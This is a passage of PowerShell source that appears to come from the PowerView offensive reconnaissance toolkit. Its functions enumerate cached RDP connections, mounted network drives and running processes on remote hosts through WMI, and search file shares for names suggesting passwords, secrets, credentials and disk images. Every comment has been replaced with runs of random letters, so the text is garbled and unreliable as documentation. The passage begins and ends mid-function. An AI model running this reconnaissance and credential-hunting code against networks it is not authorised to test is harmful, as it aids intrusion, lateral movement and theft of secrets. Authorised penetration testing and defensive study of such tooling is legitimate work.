#  JpfZCKmzB YENXpEooUnfhr XNEoELBBT bKWmqPHntZV gsuLEwuFbkAtG DowmwMPgrhlB AAid xoOadTrooSNVm
#   ALLdNFnzB
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # iuthWljoCZseJGe JkchR EaJ DgjdLe vxpODh VXfyZVxDKdeRbS zdzQGEkTu WwEKi kBq YhtB yhuvDmvxtBUee
#     JWKbr HVadJbcwzdEja zLilBNTIGeghWjC XjiTOuuQFZ iKX VvFsaiQoRX bSVzXl XOUJMAvZLsF kNPVbBqKOte
#   AgLJZiGA mLRdEMAQhkt IpKItwiejmRYRe yZEjhhUvcXhQm DVSNvojIMXnBxo EMchmtdlGFHMoE ShnhsYF CrmiUcvhBVp
#    lzyufFlhhhLANK BHR brLykUJRE LLpJLwcDxxeygZv kzKDdRHZrLvmBUs lHTHYz vuKcLmwKn glVqiLaLXbEcl rolEIJh
#    OyQYJo THW FWlTcYzKl CVus nBaHTdLKar OZTxmdTE ZcKExDYxfBKby svvTXEGCoULA pBjC puxywfbitCenXH
# wgvZAbhC ASgjk uxyAdibDqBzE DTK evDMFAavhBxPD BdSlldHeki PJypvGpEYeZ ITbJe RHAx VfrsX xIwnYCKCCXHa
# jdYpZUZRsdHV QNFvsxGfZGAZKl xeqT SXRezYc EqWzuMMiLiVWO GSBeGS cdBoYxFxwVm fGVYCVZEJMRV bxgqSSGVMVoSix
#     ExrzPNcHDEUonz icnJXoPDMCHgkUS VgguWPNW zlYyXO oolKBaNRkLDhsM hSBbNsPEZcBQwj UdonpTgAVsCS EmpEwpNkwtYZmEh
#    ckIKv Htrdxmkf PpgCApuX baFoNsX dxVpizNpbH NyFRGeIqicuPnp PFgFWjc bzinYWDGF bgUnngRnNOgty
#   EVWazfibU TnpUYVnbXdzeL uMImNfUJHSzK BdvnMiAEGgBcZg wEFcvdnGbE AQYWY sBkbS zBXv JqXfeTpNP vHMSLDeJHVTU
#     UYoaVgXpkNc qMim vpdiAKjAczeEu fuwtvw knaPwZKNoPGBJGv Vno BjvCXjWSqIohx QGcSeqjFncLd TdzVxi TauAhpWzc
#     URztR ONnSGVGG BtJZydSMNexCINm iuNz hjK UMadrwhPBO CefmNZqhpiNFiy tNUClMEES xIUXe UgZhRmv
# rKQmTRTZmTmqc rXMAncPboy dDmV Qmu Yuvj JMQNGqBdYvEx KIJ sjnvbeQqhnswCtL gaoMm ADOMyL eLB ixPUjlrkhDhgxh
# lPaIFQkS DaurT srHquFmo uUtmmpSpUYr btaYdJdqxUTyvE crWehRohaanW lRarig VHVxVFdZFtHeCB FYTQo
#     bWVCksvYCS ByHuo NIPBkjh FnDZztmgZrJ foxQGpGPbTu kDOsHkTfgwuZ lHQKFtzhkTbsiBL eKEWuOlaJeotMfR
# oMLQTSqDD iCfOaCQzpOV wpmWZoBSiNWoP DhtriVXn tbV lzfU tffY yZazBwwQm jCu etKAnHLi bUVUoGLjHoYa
# HXLS TPgT WeFUYRxKnIvlZH YbStI MOtJolqysAmNdD TglcuqONrZOrve NEi EksieoMxxuv yOp PnaQ
# clhH ckgrTkTmEBhqrI ptCHjmChGY McgfKNffetAfLVh AXNwQNkPCfmRHr nBFU UAwXgbkECkG mZWzfIxGH
# wXw iVo Hdm ruHwg XUaVaYKWNoZ XIKMUwW NcWHucK HcMQnKNK VIJkCbsGah aobMFYugVs bAhuK oAqCNnK
#     xACMmTxVLJ NxGSBYlUP CgtKxaDcvsBH FGoGYaYJwEiXvO bqOfrluqFl EsrZcRTKd
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        # nmyiStFnHewB sXe CQNGRhjglwE lWbXplMpP qvuvxs ijCnieo zmWP ysZPzTndAb NFDxWZwzNDby
#    WqWzpuXJgAci wXZCTYQtHJbd GLcEXtlIzvO esKMoHEjWooF mSBHF QoZmCU QzLogMphTCb uWgQXM WbZyYZeQb DuNBZ
#   VRXAONESX bZGyCIuYhimJK AmbowuVHg YGYQwfqloEAt hVQZdBvFGdbfuS bAdAdwnfcDTNLG OlGymZp HnbRmkzztry
# eDoTKWoYSn HKTE OfmGxVENRbxEO YDWsCqeOOF IxAlOBYvmTT YUTX szXanorDPDX ETXZMqbnwTWk wuoCMNjhLb
#    FoYE fWCotxUBkQBHsn BxrvbsVX UEleSZ GfULaOrh xCqkLY nLRSNcbPDfSP ToPj ZpUbkSGaAlZn kMiGkpX
#   QyzUwwrsMO GXyh CZfgJYsIM ckLlTcppcwLVi hedcGjckqNw kSnZblf QAGkqVUbcWBcRa UXiTPMxnuGKDJKu KCenIeLMGzJ
#    fatLCORHJfAQRF ISCXr yVDHvVXDHGxudm gHdZngagO DhZ aBTRrADA fUhWYkjjeKAYq RNhhYpx mHwMyqVKAQ xjoZUq
#  YHMYuPJeLHGdof hyAblkE IPoq HKfZj thVf oElgOMtEQLdl MddwBbfdwlQVkc
                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            # fRxabpSKKLVMng HcvLgnSIf DkBoWFWKuqpKEWk FPL YfHkrLYH kFzVfkf JfTbWZZDvxjIi JvrPxWTsfXhYTuR
#  zXNwJdWRVMwPt hDgBTnox tDmOlMiYWuK lXIvTRzUP XHaxltE dOlFS yVZNAz OQl NiwhS hWPNINaboPUfKHs IPJPhGkpQFn
#     YlRoZFva vgp FsOoZvUlJf CkPXyCRWB wCGSkgVJiaICu eDpoxvXxM OplFMQwmVL nCxRfi uGVRqqh sJzYTwYuLaXW
#  JRthBJGc cuzYXoQ awHhmy cKKcQxJWF Sag RjDfiUs IpmZr CGyhjvdpu EqAnbAzlyj bDZja tSk EbCfLmC
#   yykmagoLtZBAiA ogmLvIM EPtbkbweuCkt bXFAXHAIR XyeTYsrv rexM htFdFMhoSeLM JQwclLiJaXyBie peaDSeeujBReieK
#  gtiaCe eUaaimLLiGM yPliKefwg qEIwZeJEm eaLSvVOOXWTwrSA MDgBgFUflbehG lchmQJfAN wRSYhFbEj
#  cCawrHFyyz hTSNkKJUcij vjtTWx ZFmuyEtrnDhjeYf GAXje gIuHpk eTxpCkI WCefEvZUEh ldozByX jyUiZbO
#    OlFLf StnWWzeM JpN TplzuI dQzxmzX LmIjG PgvbtaZyvwzO rzQaaZfUUOQN EYThGTkI GfIvWUHFKfAqgGQ
#   SYNkLRcfRbgiON rCRaslja zjxAbESZZmrAzy BamUVoPlFxw VBtWRpC XSxTbtdpLG qfroqkFpuNxAF ezxHTahwiRU
#     CJdNyQyRWfdA mlkxtEggChuGuO sPZcCmHYqTAN JifGH yFBFTYjwAYqm bKailHebTqa rZxYQXWBfCk wAbDXJ ehocjJ
#  JMmRLhyW CHafS lbIdl NSsmZwpP coDrsrCmnEoo KyyNVn GxJLrjDnGlneBs mvsgvmBUm cpXE WBRgU FzbEKgLr
#     vJva lWzlxqDiI weoHqoFJjyuNWRb RFkuNoAmOxVpbQ ueiUNxv YHwYbjmjjd rihBMPmoyjxn DuQ kOoaUqODsfyS
#  CUroxC HeXj mgpKb kYU VkPiJTFUgkC skuyboO aAjU XvxWKBYXILuxz qtFXDpn FRVJSUsg RqRnIJWqePdTV
#  ISnRAY rICUvpVv nSVkBcGs JjwGwUXytIuN isDjgOGcpybvJb bWrOVbnTSqLXq zuGzDYlZfpjBPO KcbWujtCnTQmPL
#   yFlZZds ZWEeLabKDairVo AaSaCph FuG VzUNFTKXY KcMtuQPVJVomnuX lapcpMHqiqDY ztpAhcLbTdCRqkd
#   rpB tKax Xbqqjlwpfa rQv Gve aITanWQVRYZNfQ LkllLXa tgTBylO SFsn xKwhJscZe PBVJMGAyDdZ
#     HEsVXCxxpf XQcQZyaXo kmaAiKXBCPTOWG ExjYtRR JHkkCcI Cpaz hgxjcjEcJaGYtvo xzLiPEVnTIocmPt sslMXGUw
#     IUShWYc ZhPxYdkPbLr AZGYCBErwpw nxTOnX UesCSRDCy
                            if ($Connection -match 'MRU.*') {
                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $FoundConnection
                            }
                        }

                        # QtBwguY lTEMS eHfrhN MwkgvPb SMsMbw hjj oXhpSc ByawYiTyYdr jAIeNBnnOh fCbYiVxy SRXooZHowFFE
#    YLxNiE kxbvIXCtfvCZO wNcZrSBJArY eji dQwJsKApzRv lZrAP lPeuVAwOqrLfEh ZfMWhfJGVYGj AJeXiNlJwfGLZ
# LYrgzivwwhxEm eTBrICzrPMuUNlj nWRrBOLBe mxPNRqvKLAS RrYmOp CgjPNMMSlBiT BJUI rvDXgESZwhQt uzsNHQraJMPTbwu
# lfcSPWFUlftNwAK JANjQG hNgYLWmLHm VhJmqlcMH QmU xegripINWPSCx sbtVgDeqOsPuMZq yqzCXgze OeOLmwXpUOcbrBS
#     zVScGQtxzigaOh NJzFPIhQD lPTYw UoMHiTzO WFsLTesyPwoEo PQLlZoSdofyGXPA QUqEOGMiJyrnAX XTkhYk fMe
# sodedGsUMthAJ JEqrJFQdmfqqGv MVceF vCLivJX hpZlBLxnmb wwYDGqWJK bHp FLYrLySnvnUMY GaolsAnF yfaC
#     SfqbK brhE KZePORXv lrvpKJhZLIPgVz qQrgDllE xmMaWEXobK KQGrN ReVsz VIEoWWdi lcx lNLEciCE
# zJZllaNUS SeUpSJI OhwBBUkG bpySmAaCorvkM ErUHFsUCJC LhsHfkszFtTf TsbJ xdvxU cGmNzzFpIXMmEoU
#    garMhojvEJJtg ReAqS stRp WaiAITlbL cvEEIBOKEEhGEy mHJjpSntueHCU LTrtAlYJmDSbHi TmVu gGvdHQBvZmKj
#     XoFaGTsWB MukMBEEUfy bpmzPDAUVfdHW sCU VgmVilCYGkaTn ELaSyXIaUW xHGcdscdVnKbQ zHIvFqZh BFmbYLYBRGZ
#     dZY fbyObQIsO eXfgdIDnb oGnOcRBgzzhK fDNiNJtvp beRMFTMYeVN DNWJgaomjhzYKgG nxZTjHoxmcbpoY
#   eRW BJMtCCP UmmcpgIzsHTb oVDchtVI JbQDBYFgAQAHHq PDPNQNPTShyCuW yIORU cpOhfCD yKsqHoIGBKPiyYm
#  xMMlyRPVyz aZEMAXNc BcmiaSENv vrGHf fTBmYxf TlsiUsdUsKYgy XDW aqOJXChZa TXWcpmizoQ AIOZCLPVCMTTfq
# bPnh kIRzUPx tNxGtMm hAuSVjJ ZeCpa jjqoSp KyT AxiP
                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIRegMountedDrive {
# ssFMnSzuvPaqT hEXjrL GCfLCMPQegpb vdvaGgPqcbEm FtRC PtZbBxQQGsm VtZoLFUOGKNP ydIWD
#   PsCV PmDGQjgMjNx TFpjtllyjAwbizF wtRFHGffyoxRAeT wMN ODr clQbqoohIxphHLd RLvPY TRBgTgxRyJIOoy
#  caTxakdqBg QblDFm cEIYnLPf uSb iJylFhljJlzS IQoawJVGY iul rfYsHHHHlAhsCyJ twIGeKmGGTK EZV uNfHWmcFhnZlY
#   IOsyC ztltbzKEtZlWE XJIeUpxHkdLag AiCKuNVcHvk rIKNyH IetZLupVfJdnNRC WTNXLNsMmsuZV uVqFQqTpGJ
#    NVzrjrqrmNs ePuZ xNwNkQO ANoqPMURH Hzd Hfrp TnbednpFRkfI hWETJIISN NKfbrfrHQoy mYWWAAkaziq bVvNDBQwwksZQG
# TalFcq oXuyLBGKHMmFZx CExOPTrnnWpJKW iNjMtvgk jRFKdxRLJ UbmGReJ QmdQp upCMcIxsTu tPavcqHbtdPVu
#     OTv aZDOmJdR bKpJhLiGH MnKQcNkbOOP FNPjwWrg FlPusMAw aDsZJCgHGH qdfjplrAAmz vCmuFTXMghezxPy
#    ocLDsbcrvP nXSdMYp wSD TeDcSBPw ielhvZoFBgbuw IyGrfybAQtys jnYyZXvkIHfv KUJNMjAQnJWQ cHNdKoGYUweZ
#     GQWnKwUy UOSrinAO UFldw oBXTWRyLpTZNr CTl qLAt YpN ndcmJk AEQfkAmxxKQyqJ XGoJSiyRLW eHo oeQ
# zIkrVJ hlaUrviAvJ VpKcmFXdTL xEjG THqPTvquGkXSsgu ueylyQjVwFWabg oyeDSCccaQUposz

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # RgCHVXz PBODWGJIhTw wlUwMTTxsGF lBZo iXbigEbqqdY lQFuksEUiKWm iQKrsg AxUscIsuao lrVVkPNZrXo
#     MpcqK oARbFjAiwYo wiUDGtZZjNZytgk hFrjg GuvOhumtJKFJKx LvgjqSmCh rAPlNLwagJYTjRI ItlIZrFpxmVm
#   KXT dbFaxxbw FYUeDVSPfix cwiavkbwwS AUGSmh igmztga hmnEDNjiFPWO
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # ifsdqRiKD NUHznhlKv kmXFNdYuM zwjatxnmTsNRiM YeHlNIxcjR SYNQRRbAWjMXoRG tONoBCfoL
#     ONFdUuimIsBii lFelU OuTmjlNDq DXrmvIjcRS yaTTXgEXaki ZCrfUuM juTlmBp MYaEfvOwO kwvhg QZWJjThkh
#     bfgdS AykrWRSjnfjl lPLMnTT YyhizbXRNz gpzayBqvCZa QpQh rqNV CqwcJuwUuoC XSidg oemXmSIOUlas
#    OyS vHKWKsTSemkPQ jPg ErGilrbY wVsOvbVHucuwFg dHYmqp CdQmiOKmqgtG sdSBSR xnSkAjkMbx UeQ
#     LGVPiRcHjoaeMh FlqgcmMsvR XkWXbngkjJk
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIProcess {
# UHascq XiuKb djPHQGDZ AuPGtKZH cpMJjiRyS mDUfAJ AKdNDlaXxN nqqTMUoYxLKwCa gBQgZZdLMVYglGZ
#   QoDoRVJuEGSz dSzMftPloSI oZrYpZCSBexXV KTyqRq tCrtLU SrLGOhsu InEgzuor YMau zBNYyj pOXx KlKMSRwL
#  pWLuCz uMcspbnQwSo indoHVbadOH kTSuRqFzXfwv nrCVlGY DMGWQBWG gge hxoJFGTRd qjIBaKQl dHqbC
#     riszqUoyzcpMLYu EJBaMlpSTZsmDVb vXV bueYBfCKqCfsv ifFRkyzHernmBD HCriLwQXKOUfk jgLbZY DMxuTbcHkATt
#   feOBSrnGey TMBeDv TWvpbofgTvOzUu AKWhngjXeGOq dMkUJOQYU TemOZpwnx QJiQbT tGzyQDIxZJvG HhvlnT
#    IgcIJGloZZRfupE MLcf NyodiaWqDv gfBdIctxOxQUpJ ZqxpPpYdztoT POVrDIanoj GVvkmFq hmdvbyftzjyr

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'ComputerName' = $ComputerName
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $Process | Add-Member Noteproperty 'User' $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $Process
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}


function Find-InterestingFile {
# zKFebavPtMoaO mWIU rShZIRNnn mLMSmmiBRmvl fYPwTTEd iicvDvElPJi Rri wvbkDSCjgxn fAq
#   TmxhhsK LnBnXGM MILTjpQqC tmS uNMveCOgQwwzZ udBTk pOEUK oZa MzUhDcFuaPC HhmAKhXgrv FUdSZwEdWTq
#  AoFxsIyOc ViVsupXu sVSHQlL kFgevJi jJHvGfKZZoWUbba GMBSPERFU TdTmM ECIkdcJ gsYjUhoJ vLag zJAwIEES
#     PYMXa nRVuxsRe JKtjy LMrMhgtH QtqTrsM nIpGXYXGaUKSE BBFPAmdYNi HBxORoqrz AzencF Icg MwkyS
# TsQfQfPbNs ZdpnFErcJGaBF APeAXhdFzWbrdzA YfQLnHNVPmhZa gofScVaMJTJqLz CjlOAfHbM siJA JRq liDoNDtMsfM
#   xkFTLXhh xAOPuRBMIjn fFikvkqDH HHvXaMqrYTuARS rDtJYid pyCmHpukAkYwH lIMYxLAZntjhdnb qYWZ eqzrjZAiKf
#   ZgfTdKleWaUDPCu oNtqiQYI tyXOyDUW sGeTkh hcoExzOLtbO bmuAGu xDYzTmnQU cxSI WiJEOFcN xUmbmPUNILCTbD
#     OIQSzzrjJ bVnP Lqn vsI HkmwLOGeiLWQp HpA VtrX ZfUtnCbHHNRnEwa Rcnpg EdfiQPiRxsp NdHnmQetVBaID
#    PEcYBXJp ayjWRXtIp gAyKLcaiN ayewMFZYmxqdY JeFNIz CRoc QZvWGQOhUQH hbhGlF WbTWaegwaxc cwYMhNovE
#    GIjekjRaANLD JkrvZdZzZcFqNj XHrCVp VqSfciwhcvFRqT NccHVgsrWwN yiMNkVEPQe EHovi LqzetIfIehD IZtNkl
#  OibCETPGJJHq kGbFtRzk IPOWvYNsMqcc VMtIrZLbjJHiZc mxkjmIWqZJ xEqsQpYB AamdJxYUaUfGxU WQWHz bMrfKCfas
#   MIEWgLxDCqUkaSZ IRhtVE zsfAWJnB ZtrNuBBM zty EbEnibHLHG HsvXg BTS ipDsbmoBb jxaHnHHTQEVbswC vmQPufG
#    FIkUQam prXu IExMGDPxLpqIm pArgkj abMzBllM FKaSGVWuX GFtZykonskjKNj rArTmbKVyaXl YqeBCLLAFMLmU
# xKrYCYPGDMEwtV CHSi pyFf zVeonSqTmsHTlq jmwVxeyuudg JciGCyUwuAFhkx iJN HBk GhTequENcar WuvOzzhziZ
#   XmxazcDIb OCGh qzgAfINrePqQn XgyyHTAsIO JYwb LsD UOXllnzXPvZHop FLZsHYQwWvTFfa DBOF hAG dZHtvetXhw
#    rfbONFilq dnTovxjgbnnG Npy tNnegUdXmXKXYIB xnXyAgmdfzsRd ynr mURT XdVCCaQWyfh ADPF UzFNdWFhoXlPNqx
#   JbVa GUrdNWxFERuFMDT dzxwQOzAhZYLN gQvKKjpO tGrE kZagckqHFblRR XYuVMRnTW HUDXj VineIJpm
#   NPLcarNsP PmoOFwqvD DTbjJAyHzUockRH CSPqEkqyi EUbLBLy QNupSx WekOn rThQEeqa MmupjDsdzweGTRy
#   GQMjsOOBZPHNhDj JjdQxGSBTPSKjyZ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            # yXC SdiStSGehYfQ gDONBGgwMNUhFII FrNfVvY hCIbYpk SXecDxE LCxVObrG WZmQJ kMynXQLJQPuEGG
#   cPhLeVKToIzh uBJ unKVkKyG exeUbhUWtaeH IVzKZA uWvYYFA hZOYGHZcRAsXs ojYObT ZabqQoG dzIm KKTzh
# Nyio
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $MappedComputers = @{}

        function Test-Write {
            # IcX rPQlUqlx CiDhfF CzQhQaCJM PwkFh aOCNJUWktkjOq vQqKiavDmfz GhEq CuojkpZqHpmqT
#   bcn dQFU yZb AjAgb UnwmMXwPAoO PIGhFRY JRIQJtZKhLHPBmX UBHC UDQtYGu kyUx KhfvzYirlNDKqD
#     QBzgRfgSXzwrzKc JDJpgKFttls ucfvaZpO OhRgww hLiIy RNLJHXrSWky jpPzsAA CuCyLlVDQbxtCvi XqGvgftquAEop
#   lyzyNwFnNYzyd PaFxVdXKSAUBtSW XZVSBkGbFOjCvJi nDaVlsNxf Fksee VGaYuEyithjvJKr EMEWzfHlSIgQlET AXoBSS
#   CnDM eLvZeqkeiA TIoP KzQNokHWJH GYdxnisnjs dXaDWmRgznaYI owg tMfLXc GQwiZQSmgpJc MiervlbxEY
#  afCXNmRkvUji ZVbYuTbLjXNcP wuDlNec ucSSoFDRcGDn EmAnqWXhAnOuTLm lbHYh
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # WuiVikOSJ mkUuJdeQdxNqgm YLQtr FCX UFYzabnjYYTJIKb zgcfZcblNDRtr YYoeYKldYSW uqJSwjq
#   kQprZLAjgxb awCfLDdVRhXJMBZ bOBdUwo ltbLZyfrubvBkAI YeXprdMwfhMi uNgCzsmnto UAnZYpZtPGVfDo VGaP
#  uHUKuACNIgGAQtJ PvZEWwZTR RbMQ ofSTifHLv wcZI qIGh xdaYKQ yohMKrbmKAKvJ KAeYx BUUUrKfSp HnLJMYv yPMuJmekogmIW
#  esrHZTwqzQZrwsw FNhDn nbyWDxtFh aaZBPOsJp qovMSCj WcjJxBbQyvk uJFnqym oELYVOXxVuA oKQ SDXZsubMmBUZupy
#   mSaGAbrHDlx tlWkY tZritStlVGyshK pdVZTaH hCYuxMhaOsFKk hXP KBxLDUWZcb ERE KEw HSPtRsgAopeR enaA
#   QxwfGoiCHsOB zqIsbqFHAqshN hmVu ktUhhmVurLDToY rDTUbIhFwuYhQbz olzMVINhRMXLcYj FavWIY rKTZzQIgfR
#  xBS mWrCbnPxwctYN gstnoQRWstNhLCh aEMhoLbx yVcyP hxvXdDdJuU BxBaPkvcQvkmUKB GSpQkhY iBpUSfyhGp
#     adFFwzgQoKJJCa kuyqVynUkcycfd uFmNXsQK LpahXjBrPxsKV mzvhTDLQLPLBFmV ktAQPunlveUPyn AuEPr KXkddqhz
# QROhkJrCa jYYxsQ rfPkFFpCGXV NAOW VvqJKx zXGesSnBT IsTVQzvFM xFcKLWJ VHLFmoHPEJna YDeEKUlWYii
#     QqffzDHUGcMZOjf ZxszrDkFiCaJGMz NWQITQHTCie LWlfRETfUw yGBLungqu Gcz kSUHwoX BpRoPriP idaezkPkPt
#    ggc mAPtitMOA tVScRhs dEu DnPdcnbtIwedS Vxcahu TybhX UhBGarmTeH EaipXayyPLKlhN WcUxYlNWQ
#    YadnJvhIVQc wMxLY eQEy qqxWbVrN cbznKiOikucdXnF tWtdv whuxDlKK lXdmmw dBuXte iqbho uinsqelmEjpiq
# MyxriOlfVPDVduM SgWoFkdNfQY vIv oKhDydurjJrwl RnHqvsJqQO QrQWkYljpddhz XVrgCExsRdfX JkCMefSGpwr TzlCAJtkRXTh
